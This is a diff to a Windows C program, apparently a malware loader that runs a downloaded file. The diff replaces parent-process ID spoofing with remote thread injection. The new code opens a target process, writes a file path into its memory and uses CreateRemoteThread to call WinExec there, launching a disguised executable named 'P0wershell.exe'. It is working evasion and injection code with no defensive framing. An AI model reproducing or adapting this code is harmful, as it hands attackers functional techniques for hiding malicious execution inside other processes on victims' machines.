@@ -61,55 +61,48 @@ int main(void) {
     }
     printf("[+] Download complete.\n");
 
-    // PPID spoofing
-    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, targetPID);
-    if (!hParent) {
+    // open target process for injection
+    HANDLE hTarget = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, targetPID);
+    if (!hTarget) {
         printf("[-] Failed to open target process (%lu)\n", GetLastError());
         return 1;
     }
     printf("[+] Opened target process handle\n");
 
-    SIZE_T attrSize = 0;
-    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
-    PPROC_THREAD_ATTRIBUTE_LIST attrList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attrSize);
-    if (!attrList) {
-        printf("[-] HeapAlloc failed\n");
-        CloseHandle(hParent);
+    // allocate memory in target for command line
+    SIZE_T cmdLen = lstrlenA(outPath) + 1;
+    LPVOID remoteMem = VirtualAllocEx(hTarget, NULL, cmdLen, MEM_COMMIT, PAGE_READWRITE);
+    if (!remoteMem) {
+        printf("[-] VirtualAllocEx failed (%lu)\n", GetLastError());
+        CloseHandle(hTarget);
         return 1;
     }
 
-    if (!InitializeProcThreadAttributeList(attrList, 1, 0, &attrSize)) {
-        printf("[-] InitializeProcThreadAttributeList failed (%lu)\n", GetLastError());
-        HeapFree(GetProcessHeap(), 0, attrList);
-        CloseHandle(hParent);
+    if (!WriteProcessMemory(hTarget, remoteMem, outPath, cmdLen, NULL)) {
+        printf("[-] WriteProcessMemory failed (%lu)\n", GetLastError());
+        VirtualFreeEx(hTarget, remoteMem, 0, MEM_RELEASE);
+        CloseHandle(hTarget);
         return 1;
     }
+    printf("[+] Written command line to target\n");
 
-    if (!UpdateProcThreadAttribute(attrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL)) {
-        printf("[-] UpdateProcThreadAttribute failed (%lu)\n", GetLastError());
-        DeleteProcThreadAttributeList(attrList);
-        HeapFree(GetProcessHeap(), 0, attrList);
-        CloseHandle(hParent);
+    // inject thread to call WinExec(path) inside target process
+    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+    LPTHREAD_START_ROUTINE pWinExec = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "WinExec");
+
+    HANDLE hThread = CreateRemoteThread(hTarget, NULL, 0, pWinExec, remoteMem, 0, NULL);
+    if (!hThread) {
+        printf("[-] CreateRemoteThread failed (%lu)\n", GetLastError());
+        VirtualFreeEx(hTarget, remoteMem, 0, MEM_RELEASE);
+        CloseHandle(hTarget);
         return 1;
     }
-    printf("[+] PPID attribute set\n");
+    printf("[+] Remote thread executing P0wershell.exe via target process\n");
 
-    STARTUPINFOEXA si = { .StartupInfo = { .cb = sizeof(STARTUPINFOEXA) }, .lpAttributeList = attrList };
-    PROCESS_INFORMATION pi;
-    if (!CreateProcessA(NULL, (LPSTR)outPath, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, NULL, NULL, &si.StartupInfo, &pi)) {
-        printf("[-] CreateProcess failed (%lu)\n", GetLastError());
-        DeleteProcThreadAttributeList(attrList);
-        HeapFree(GetProcessHeap(), 0, attrList);
-        CloseHandle(hParent);
-        return 1;
-    }
-    printf("[+] P0wershell.exe launched with PPID spoofing (PID: %lu)\n", pi.dwProcessId);
-
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
-    DeleteProcThreadAttributeList(attrList);
-    HeapFree(GetProcessHeap(), 0, attrList);
-    CloseHandle(hParent);
+    WaitForSingleObject(hThread, INFINITE);
+    CloseHandle(hThread);
+    VirtualFreeEx(hTarget, remoteMem, 0, MEM_RELEASE);
+    CloseHandle(hTarget);
 
     Sleep(2000);
     return 0;
